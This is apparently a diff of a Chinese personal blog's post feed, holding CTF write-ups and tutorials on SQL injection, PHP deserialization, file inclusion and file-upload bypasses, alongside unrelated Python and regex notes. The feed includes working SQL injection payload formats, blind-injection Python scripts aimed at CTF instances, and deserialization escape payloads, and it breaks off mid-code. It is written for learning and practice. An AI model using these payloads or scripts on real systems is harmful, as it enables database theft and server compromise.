+$obj-&gt;privateProp
+✅ 触发
+
+
+属性为 public 且存在（即使值为 null）
+$obj-&gt;publicProp
+❌ 不触发
+
+
+属性为 public 但直接调用 empty() 且属性存在
+empty($obj-&gt;publicProp)
+❌ 不触发（因为属性可访问，empty() 直接读取属性值判断）
+
+
+
+关键点：__isset() 只在属性本身不可见或不存在时才介入。如果属性是 public 且已定义，PHP 会直接访问该属性，不会调用 __isset()。
+
+2.代码示例：class User &#123;    private $data = [&#x27;username&#x27; =&gt; &#x27;admin&#x27;, &#x27;age&#x27; =&gt; 25];        // 当访问不存在的或私有的属性时触发    public function __isset($name) &#123;        echo &quot;__isset 被调用，检查属性: $name\n&quot;;        return isset($this-&gt;data[$name]);  // 动态判断虚拟属性是否存在    &#125;        public function __get($name) &#123;        return $this-&gt;data[$name] ?? null;    &#125;&#125;$user = new User();var_dump(isset($user-&gt;username));   // 输出: __isset 被调用，检查属性: username  bool(true)var_dump(isset($user-&gt;email));      // 输出: __isset 被调用，检查属性: email    bool(false)var_dump(empty($user-&gt;age));        // 输出: __isset 被调用，检查属性: age      bool(false) 因为 age 值为 25，非空
+]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入一</title>
+    <url>/2026/04/11/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[一.判断数字型和字符型sql注入
+在表单数据后添加 and 1&#x3D;1&#x2F;1&#x3D;2&#x2F;3-1如果无论1&#x3D;1或1&#x3D;2都能正常登录，说明是字符型sql注入，否则是数字型sql注入。
+
+以上两个1&#x3D;1和1&#x3D;2都能正常登录，说明是字符型sql注入二.查找注点
+在字符型注入表单数据前面或后面加上’ ,” ,’) ,”) 查看引号的包裹方式
+
+三.判断查询的列数
+因为union合并的两个查询语句列数必须相同，所以必须查询系统表的列数，然后使注入的sql语句列数与系统表的列数相同。先从大到小以二分法试，直到试对。
+查询的函数为group by h和 order by (推荐用group by,更不容易被防火墙拦截)
+以上一直查询到3列才显示结果，说明查询的列数是3列。注意：第一个查询结果无效，比如select 1，2，3 只会显示2，3结果。四.使注入命令的执行结果能正常显示
+在注入后系统只会显示union查询的前一个查询的结果，所以要使前一个查询无效，让前一个查询的结果为空，一般把前一个查询的id设为一个不存在的id（0，-1等）。
+
+
+只执行了union前一个id&#x3D;’1’的查询的结果，而不后面的查询结果。
+
+
+让id&#x3D;-1,使前一个查询无效，让前一个查询的结果为空，就能正常显示注入命令的执行结果。
+五.union注入的更多用法1.union中常用的数据库，表，列
+数据库：information_schema
+表：tables(在information_schema数据库中)
+表：columns(在information_schema数据库中)
+列：table_schema（当前数据库名,在tables和columns中都有）
+列：table_name（表名,在tables和columns中都有）
+列：column_name（列名,在columns中）
+
+2.group_concat函数一次性查询多个数据
+
+使用group_concat函数后可一次性查询多个数据
+
+
+多列数据用组合查询
+
+3.查询列名例子
+
+知道列名后，便可查询列的数据了
+
+以上是字符型sql的union注入的用法，数字型sql注入的用法与字符型sql注入的用法相同，只需把id后的引号或括号去掉即可。六.extractvalue注入适用场景
+无显示结果：SQL语句查询结果无法直接显示在页面上。此时页面可能只返回“操作成功”或“失败”，但不显示数据库中的具体数据
+报错显示：目标网站的数据库错误信息（如MySQL错误）会直接显示在网页上。这是EXTRACTVALUE注入成功的关键前提。（同时满足1和2才适用）
+
+基本格式?id=-1&#x27; union select 1,2,extractvalue(1,concat(0x7e,要查询的内容))--+
+例子：- 查询表名
+- 查询列名
+substring函数系统默认只显示32个字符，是使用substring函数后可以精准查询每段字符基本格式select substring(字符串,起始位置（从1开始计数）,长度)select substring(&#x27;134abc5324&#x27;,1,6)# 134abc
+使用前
+使用后
+七.updatexml注入应用场景
+1.与extractvalue注入相同2. 在extractvalue被过滤或拦截时，可用updatexml注入
+基本格式
+?id&#x3D;-1’ union select 1,2,updatexml(1,concat(0x7e,要查询的内容),3)–+updatexml与extractvalue不同的是，后者只需两个参数（把第一个无效查询结果占掉，第二个输入想要的查询结果），而updatexml需三个参数（两个无效的查询结果把想要的查询结果包裹起来）
+例子：
+八.floor报错注入适用条件与extractvalue注入和updatexml注入相同，三个注入哪个被过滤或拦截，就用另外两个注入方法。实例
+
+1.查询少量数据时可以用group_concat函数查询多个数据,当查询的数据量较大时,使用concat加limit0,1 一组一组查询2.rand()里面一般0或4,作用是随机生成0-1之间的小数3.concat_ws(‘分隔符’,’字符串1’,’字符串2’,’字符串3…’)作用是将多个字符串用分隔符连接起来4.floor()作用是取整，将小数部分去掉，只保留整数部分
+九.布尔盲注适用场景
+网站没有报错信息和查询结果，只返回成功或失败的信息，无法直接查询数据库中的数据。
+实例
+
+以上页面只返回真或假的信息，只能一个一个试，试出所需信息每个字符对应的asc码值，再用chr()函数转换为字符。
+substr函数可以精确查询每个字符
+利用二分法和python脚本可以快速查询出所需信息
+
+十.时间盲注适用场景与布尔盲注相同所用函数- sleep()函数
+sleep()函数的作用是使查询语句执行时间延迟，延迟时间可以设置为1秒以上，根据延迟时间的长短，判断查询语句是否成功。
+
+- if()函数
+if(条件,条件为true时返回值,条件为false时返回值)
+
+实例
+
+由页面延迟了3秒，推断出字符的asc码值为115，即s
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入题目合集</title>
+    <url>/2026/05/01/sql%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[一.[极客大挑战 2019]BabySQL 基础的注入题目一开始先使用万能密码1‘ or 1&#x3D;1查看登录成功后的回显位置
+这里报错可判断出or被过滤了，再尝试双写绕过过滤
+这里登录成功了，说明可用双写绕过，再查看列数和回显
+这里报错判断select或union或都被过滤了，再使用双写绕过过滤
+查看出列数为3列，注点为2和3。这道题会显示报错，先出尝试使用报错注入。注入途中发现substr,from,information,where也被过滤，使用双写绕过。
+最后注入成功，查看出表名，然后依次查找出列名，列里的flag
+最后使用substr函数提取出完整的flag
+二.[极客大挑战 2019]LoveSQL 基础的注入题目原理与babysql一样，不过没有函数过滤，不需要双写绕过，直接报错注入即可拿到flag三.[CISCN2019 华北赛区 Day2 Web1]Hack World开局先用1‘ or 1&#x3D;1万能账号查看，发现有sql语句过滤机制
+用sql字典爆破查看被过滤的sql语句，发现空格,&#x2F;**&#x2F;,or,and,–+,#,union,还有一些报错注入的函数都被过滤了，无法使用联合注入和报错注入，优先考虑盲注
+因or和and被过滤，所以可使用异或符^来判断页面两种不同的状态
+因为真为1，假为0，且1^1&#x3D;0，1^0&#x3D;1,所以括号中条件为真时，页面输出Error Occured When Fetch Result.当括号中条件为假时，页面输出Hello, glzjin wants a girlfriend.可根据这两种输出盲注写出盲注脚本import requestsimport timeurl = &quot;http://9fa0f800-14a7-4413-a377-9a5266bf3592.node5.buuoj.cn:81/index.php&quot;result = &quot;&quot;session = requests.Session()for i in range(1, 1000):    found = False    for ascii_val in range(32, 127):          payload = f&quot;1^(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))=&#123;ascii_val&#125;)&quot;        data = &#123;&quot;id&quot;: payload&#125;        r = session.post(url, data=data)        time.sleep(0.1)        if &quot;Error&quot; in r.text:            result += chr(ascii_val)            print(result)            found = True            break    if not found:        break    print(f&quot;Flag 获取完成: &#123;result&#125;&quot;)
+注意1. 脚本中使用了time.sleep(0.1)，是为了避免请求频率过高，导致服务器繁忙请求失败，从而使得到的flag残缺2. 脚本中使用了session.Session()是为了保持会话状态，避免每次请求都重新登录，导致注入失败执行脚本，获取flag
+四.[b01lers2020]Life on Mars进入题目后无法直接获取get或post参数的变量名，抓包查看信息
+发现get参数search，且只要地址正确，就会返回以下页面、
+用order by注入查看字段数,发现字段为2时，页面正常显示
+再使用union联合注入查看回显位置
+发现回显位置在最末尾，再查看所有库名
+选择一个库，依次查看表名，列名和列内容
+这里刚好得到了flag，如果没有就换一个库或列继续查找五.October 2019 Twice SQL Injection考察知识
+二次注入
+
+先随便注册一个账号，进行登录，输入sql语句查看过滤情况，发现没有过滤，但是单引号用\转义了，初步判断为二次注入
+尝试注册用户名为：1’ union select database()# 的账号，登录后发现回显数据库名
+进一步注入，注册用户名为：1’ union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()# 的账号，登录后回显表名
+把sql注入语句注册为用户名，依次查找列名和列内容，最终获取flag
+六.[CISCN2019 华北赛区 Day1 Web5]CyberPunk考察知识
+二次注入，php伪协议
+
+先查看源码，发现页面源代码末尾有提示file传参
+使用php伪协议读取php文件源码的base64编码,再解码
+依次拿到提交订单，修改订单，查看订单，删除订单的php源码，发现修改订单的代码中存在注入漏洞
+$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];#old_address没有被过滤，直接作用再sql语句中，所以可以在address中注入sql语句，然后通过修改订单使sql语句生效，最后通过查看订单回显sql语句的执行结果
+查看库名
+在地址中输入：’,’address’&#x3D;(select group_concat(schema_name) from information_schema.schemata)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+查看ctftraining库的表名
+在地址中输入：’,’address’&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctftraining’)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+查看列名
+在地址中输入：’,’address’&#x3D;(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’ctftraining’ and table_name&#x3D;’FLAG_TABLE’)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+查看列内容
+在地址中输入：’,’address’&#x3D;(select * from FLAG_COLUMN)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+发现值为空，没有flag，被骗了，再尝试查看文件目录是否有flag文件
+在地址中输入：’,’address’&#x3D;(select(load_file(‘&#x2F;flag.txt’)))#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+最终获取flag七.[GYCTF2020]Ezsqli 无列名注入考察知识
+布尔盲注，无列名注入
+
+思路1. 先输入1‘，1“，只返回了bool(false),并没有具体的报错信息，所以报错应该不回显，排除报错注入2. 依次输入id&#x3D;1，id&#x3D;2,id&#x3D;3,id&#x3D;0.发现id&#x3D;1时返回NULL,id&#x3D;2时返回V&amp;N,id&gt;&#x3D;3或&lt;&#x3D;0时返回Error Occured When Fetch Result.可用布尔盲注3. 用sql字典爆破出被过滤的字符，发现if,union,or,and，information等字符被过滤了，还可以用^异或来进行布尔盲注4. information_schema无法使用，可以用sys.schema_table_statistics_with_buffer库和sys.x$schema_flattened_keys库代替来查找表名，效果与imformation_schema.tables库相同5. 但是无法查找列名，所以用无列名注入法，查找列的内容，这里用到了ascii位偏移
+
+给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0,且两个比较的列数和非比较列要相同（比如select 1,”b”中，1是非比较列，b是比较列），如果两个首字符的ascii码都相等则比较第二个字符，以此类推；如果前面的字符都相等，一个后面有字符，另一个没有字符，则有字符的大。
+
+
+6. 根据以上规律，写出盲注脚本import requestsimport timeurl = &quot;http://ad2dd0bd-164d-4573-92ac-bb267528221b.node5.buuoj.cn:81/index.php&quot;result = &quot;&quot;session = requests.Session()for i in range(1, 1000):    found = False    for ascii_val in range(32, 127):          flag = result + chr(ascii_val)        #payload = f&quot;1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema = database()),&#123;i&#125;,1))=&#123;ascii_val&#125;)&quot;        payload = f&quot;1^((select 1,&#x27;&#123;flag&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;        data = &#123;&quot;id&quot;: payload&#125;        r = session.post(url, data=data)        time.sleep(0.1)        if &quot;When&quot; in r.text:            result += chr(ascii_val-1)            print(result)            found = True            break    if not found:        break    print(f&quot;Flag 获取完成: &#123;result&#125;&quot;)
+7. 先用sys.schema_table_statistics_with_buffer代替information_schema.tables库，查找到表名f1ag_1s_h3r3_hhhhh，再无列名注入查找flag
+八.[SUCTF 2019]EasySQL 堆叠注入1. 先输入1或&gt;&#x3D;1的数返回Array ( [0] &#x3D;&gt; 1 )，输入0或字符无回显，返回为空，推断可能有||结构
+||运算规则：首先0和字符为假，非0数字为真，如果第一个为真直接返回真，如果第一个为假则判断后一个，如果后一个为假则返回假，如果后一个为真则返回真
+
+2. 根据前面的返回，则判断后一个为假内容及[输入的数据] || 假，所以结构应该为 ‘select [输入的数据] || 假 from Flag’3. 所以可以用*,1绕过||运算，返回所有字段的内容
+输入*,1后，结构变为 ‘select ,1 || 假 from Flag’ 因为 ‘1||假‘&#x3D;1，所以返回所有字段的内容(包括flag)为什么是,1，而不是*,0&#x2F;字符？因为0和字符为假，0 || 假返回空无回显，无法查看flag
+
+
+4. 最终获取flag另一种方法是通过 set sql_mode 将 || 的语义强制转换为字符串连接符。执行以下两个步骤的 payload：
+首先执行 1;set sql_mode&#x3D;PIPES_AS_CONCAT;
+然后执行 select 1。
+
+这样做能将 || 从逻辑”或”运算符转换为与 Oracle 数据库兼容的字符串连接符，从而拼接并输出完整的 flag 内容。
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[安洵杯 2019] easy_serialize_php 反序列化字符逃逸</title>
+    <url>/2026/05/17/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[1 题目描述打开题目页面，只有一个 “source_code” 链接，点击可以看到源代码。
+2 代码审计访问 ?f=highlight_file 获取源代码：
+&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;, &#x27;flag&#x27;, &#x27;php5&#x27;, &#x27;php4&#x27;, &#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;, $filter_arr).&#x27;/i&#x27;;    return preg_replace($filter, &#x27;&#x27;, $img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);  // 变量覆盖漏洞！if(!$_GET[&#x27;img_path&#x27;])&#123;    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123;    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123;    highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123;    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125;?&gt;
+
+关键函数分析1. filter() 过滤函数
+过滤关键字：php、flag、php5、php4、fl1g，使用 preg_replace 将它们替换为空字符串。
+2. extract($_POST) 变量覆盖
+extract() 函数将 POST 数组中的键值对提取为 PHP 变量，这意味着可以通过 POST 覆盖前面的 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量。
+3. show_image 功能
+当 $function == &#39;show_image&#39; 时，会反序列化经过 filter 处理的 session 数据，然后读取 $userinfo[&#39;img&#39;] base64 解码后的文件路径。
+3 信息收集 — phpinfo访问 ?f=phpinfo，在 phpinfo 页面中发现关键信息：
+
+auto_append_file: d0g3_f1ag.php — 存在可疑 PHP 文件
+FLAG: not_flag — 不是真正的 flag
+
+由此可知 flag 很可能就在 d0g3_f1ag.php 文件中。
+4 反序列化字符逃逸原理核心漏洞点filter() 函数会对 serialize($_SESSION) 的序列化字符串进行关键字过滤，而过滤后的字符串会被 unserialize() 反序列化。
+当 filter 删除了序列化字符串中的字符，但长度标识（s:N）没有相应更新时，就会导致反序列化解析错位，从而实现字符逃逸。
+三种 POST 方式实现逃逸参考文章中给出了三种 POST 传参方式，均可以实现字符逃逸，可对比学习规律：
+方法一：利用键名 flagflag
+_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+序列化后：a:1:{s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;}&quot;，filter 删除两个 “flag” 后键名变为空，s:8 向后吞并，注入的 img 键值对被解析。
+方法二：利用键名 flagphp
+_SESSION[flagphp]=;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+filter 删除 “php,flag” 后键名变化，同样造成逃逸。
+5 构造 Payload 获取 Flag第一步：读取 d0g3_f1ag.phpd0g3_f1ag.php 的 base64 编码：
+d0g3_f1ag.php -&gt; base64_encode = ZDBnM19mMWFnLnBocA==
+
+构造 payload，利用 extract($_POST) 覆盖 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量和使后面的 $_SESSION[&#39;img&#39;]变量逃逸：
+通过字符逃逸，原本代码中设置的 img 值（guest_img.png 的 base64或sha1(base64_encode($_GET[&#39;img_path&#39;]))）被忽略，注入的 ZDBnM19mMWFnLnBocA== 成为了 img 的值。
+发送请求：
+GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+
+查看返回结果页面源代码：
+&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt;
+
+成功读取到 d0g3_f1ag.php 文件！其中提示 flag 在 /d0g3_fllllllag 文件中。
+第二步：读取 &#x2F;d0g3_fllllllag 获取 Flag/d0g3_fllllllag 的 base64 编码：
+/d0g3_fllllllag -&gt; base64_encode = L2QwZzNfZmxsbGxsbGFn
+
+构造相同结构的 payload，只替换 base64 字符串：
+GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;
+
+最终获取 flag：
+6 知识点总结
+extract() 变量覆盖 — 通过 POST 数据覆盖 $_SESSION、$function、$_GET 等变量
+反序列化字符逃逸 — 利用 filter 删除关键字导致的序列化字符串长度与内容不匹配，实现反序列化注入
+PHP 反序列化容错性 — PHP 反序列化时能自动跳过无效字符继续解析，这为注入提供了可能
+
+字符逃逸的通用思路当序列化字符串经过替换&#x2F;过滤操作后，长度发生变化时：
+
+替换后变短(本题)：利用长度标识 &gt; 实际内容，向后吞并其他字段
+替换后变长：利用转义字符导致闭合提前
+
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2026/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[一.绕过前端js上传适用场景
+文件只用前端JavaScript限制文件的上传类型
+
+实例
+
+禁用后便可无限制上传
+
+二.content-type绕过实例
+
+把content-type改为image&#x2F;jpeg,image&#x2F;png等服务器允许的文件类型，即可绕过
+
+三.特殊后缀绕过适用场景
+服务器采用黑名单限制
+
+方法
+把文件的后缀改为php1~5,绕过黑名单限制，之后系统把文件当成php文件执行
+
+四.htaccess绕过适用场景
+服务器没有禁用htaccess文件
+
+方法
+编写htaccess文件，上传到服务器，使服务器把jpg&#x2F;png文件以php形式执行，再把php木马文件的后缀改为jpg&#x2F;png，上传即可生效
+
+htaccess文件
+
+文件名只能为.htaccess
+生效范围为当前文件夹
+
+
+
+五.user.ini绕过适用场景
+
+服务器没有禁用user.ini文件
+服务器原本有php文件
+
+
+方法
+编写user.ini文件，上传到服务器，使服务器在执行php文件前后，以php形式加载木马文件,然后把php木马文件的后缀改为jpg&#x2F;png绕过黑名单检测，上传即可生效
+
+user.ini文件
+
+文件名只能为.user.ini
+生效范围为当前文件夹
+
+
+
+]]></content>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>我的第一篇文章</title>
+    <url>/2026/03/12/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
+    <content><![CDATA[Hello world!!!!]]></content>
+  </entry>
+  <entry>
+    <title>斐波那契函数</title>
+    <url>/2026/03/21/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[斐波那契函数的python代码：def f(n):    n1=0    n2=1    a=1        for j in range(2,n+1):        a=n1+n2        n1 = n2        n2 = a    return f&quot;第&#123;n&#125;个斐波那契数为：&#123;a&#125;&quot;
+一.设置变量
+n1 &#x3D; 0 （n1：代表斐波那契数列的第 0 项（f(0)&#x3D;0））
+n2 &#x3D; 1 （代表第 1 项（f(1)&#x3D;1））
+a &#x3D; 1 （代表当前正在计算的项，初始值设为 1，即第 1 项的值。）
+
+注意：a 的初值在后续循环中会被覆盖，但对 n&#x3D;1 的情况，循环不执行，直接输出 a&#x3D;1，正好对应 f(1)。二. 设置循环range(2, n + 1) 生成从 2 到 n 的整数序列（包含 2，不包含 n+1 但步长为 1，所以当 n&gt;&#x3D;2 时，循环至少执行一次）。每次循环：1. a &#x3D; n1 + n2:计算当前项的值（即前两项之和）。2. n1 &#x3D; n2:将原 n2 的值赋给 n1，为下一次计算做准备（相当于前一项指针后移）。3. n2 &#x3D; a将刚计算出的当前项值赋给 n2，使之成为下一轮计算的“前一项”。循环变量 j 仅用于控制循环次数，未在循环体内使用。]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[极客大挑战 2019]Secret File文件包含</title>
+    <url>/2026/05/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[进入题目查看源代码，发现有一个链接
+点击链接，进入另一个页面，点击SECRET按钮，进入另一个页面
+没有发现任何内容，尝试抓包
+发现一个隐藏的包，进入其中文件
+它说flag在flag.php文件中,而且include了flag.php文件，可以文件包含，但是它又过滤了一些关键字符，无法正常包含，所以用php伪协议，获取flag.php的base64编码，然后解码得到flag
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/2026/03/22/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[正则的语法:使用元字符进行排列组合用来匹配字符串在线测试正则表达式https://tool.oschina.net/regex/一，常用元字符
+
+
+字符
+fuction
+
+
+
+.
+匹配除换行符外的任意单个字符
+
+
+\d
+匹配任意数字，等价于 [0-9]
+
+
+\D
+匹配任意非数字
+
+
+\w
+匹配字母、数字、下划线
+
+
+\W
+匹配非单词字符(非字母、数字、下划线)
+
+
+\s
+匹配空白符（空格、制表符等）
+
+
+\S
+匹配非空白符
+
+
+二，字符集合与范围
+
+
+字符集合范围
+fouction
+
+
+
+[abc]
+匹配其中任意一个字符
+
+
+[^abc]
+匹配除括号内字符外的任意字符
+
+
+[a-z]
+匹配小写字母范围
+
+
+[0-9]
+匹配数字范围
+
+
+[a-zA-Z0-9]
+混合使用
+
+
+三，量词（重复次数）
+
+
+量词
+fuction
+
+
+
+*
+重复0次或多次
+
+
++
+重复1次或多次
+
+
+?
+重复0次或1次
+
+
+{n}
+精确重复n次
+
+
+{n,}
+重复至少n次
+
+
+{n,m}
+重复n到m次
+
+
+四，贪婪与惰性字符
+默认 .*或.+ 等是贪婪字符，会尽可能多匹配。
+在量词后加 ? 变为惰性字符：.*? 会匹配单个HTML标签，而不是整个HTML文本。
+
+五，正则表达式在python中的使用使用正则表达式之前需要导入re模块,且模块中有以下函数import re#函数：re.compilere.matchre.searchre.findallre.finditer
+
+
+
+
+函数
+功能
+
+
+
+compile
+函数将正则表达式模式编译成一个正则表达式对象，之后可以反复使用该对象的方法，效率更高
+
+
+match
+match函数从字符串的起始位置匹配模式，如果起始位置不匹配则返回 None，成功则返回匹配对象（Match object）。
+
+
+search
+search函数在字符串中搜索第一个匹配的位置，返回匹配对象；如果没找到则返回 None。
+
+
+findall
+findall函数返回字符串中所有非重叠匹配的列表。如果有多个捕获组，则返回元组列表。
+
+
+finditer
+finditer函数返回一个迭代器，每次迭代产生一个匹配对象，适合处理大量匹配。
+
+
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[极客大挑战 2019]PHP,wakeup绕过</title>
+    <url>/2026/05/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-wakeup%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[进入题目，就有页面提示“所以我有一个良好的备份网站的习惯”,是所以网站可能存在网站源码备份
+常见的网站源码备份文件后缀:tar.gz，zip，rar，tar常见的网站源码备份文件名：web，website，backup，back，www，wwwroot，temp
+
+一个个组合尝试后,发现www.zip可以成功获得网站源码备份下载有4个文件
+访问一下index.php文件：&lt;?php    include &#x27;class.php&#x27;;    $select = $_GET[&#x27;select&#x27;];    $res=unserialize(@$select);    ?&gt;
+发现文件包含 class.php 文件 并且文件是get  传参，参数为 select访问class.php文件：&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;
+发现php文件中包含 flag.php并且 设置两个私有变量 ，利用 __construct 构造函数  来进行一个一一对应的关系之后__wakeup() 让 username 变量等于 guest在类 结束的时候，调用__desctruct()函数 ，如果这个 password不等于100 ，就会输出 username…,password… ，退出函数。如果 username&#x3D; admin 就会输出 flag 否则 失败。在本题的关键，就是username的赋值 因为 __wakeup 会对userneme进行一次赋值，所以要想办法绕过该函数， 并且在一开始要给username的赋值为admin
+当成员属性数目大于实际数目时可绕过wakeup方法
+
+构造payload&lt;?phpclass Name&#123;    private $username = &#x27;admine&#x27;;    private $password = &#x27;100&#x27;;    &#125; $select = new Name(); $res=serialize(@$select);    echo $res?&gt;
+得到序列化字符串
+O:4:”Name”:2:{s:14:”口Name口username”;s:6:”admine”;s:14:”口Name口password”;s:3:”100”;}
+
+将空字符替换为%00
+O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}
+
+get传输序列化payload，得到flag
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[网鼎杯 2020 青龙组]AreUSerialz(反序列化，弱比较)</title>
+    <url>/2026/05/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E5%BC%B1%E6%AF%94%E8%BE%83/</url>
+    <content><![CDATA[题目分析题目概述本题是一道典型的 PHP 反序列化漏洞题目，主要考察对 PHP 反序列化机制和比较运算符的理解。
+关键代码&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;    &#125;    function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 